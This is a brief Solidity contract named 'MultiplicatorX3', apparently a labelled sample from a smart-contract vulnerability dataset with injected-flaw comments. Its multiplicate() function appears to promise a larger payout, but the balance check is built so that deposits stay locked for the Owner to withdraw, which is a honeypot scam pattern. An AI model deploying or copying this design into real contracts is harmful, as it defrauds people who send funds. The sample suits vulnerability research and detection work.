pragma solidity ^0.5.0;

contract MultiplicatorX3 {
    address payable internal Owner;
    
    constructor() public {
        Owner = msg.sender;
    }
   
    function withdraw() payable public {
        require(msg.sender == Owner);	//inject NONPUBLIC VAR ACCESSD BY PUBLIC FUNC
        Owner.transfer(address(this).balance);	//inject NONPUBLIC VAR ACCESSD BY PUBLIC FUNC
    }
    
    function multiplicate(address payable adr) public payable{
        if(msg.value>=address(this).balance) {        
            adr.transfer(address(this).balance+msg.value);
        }
    }
}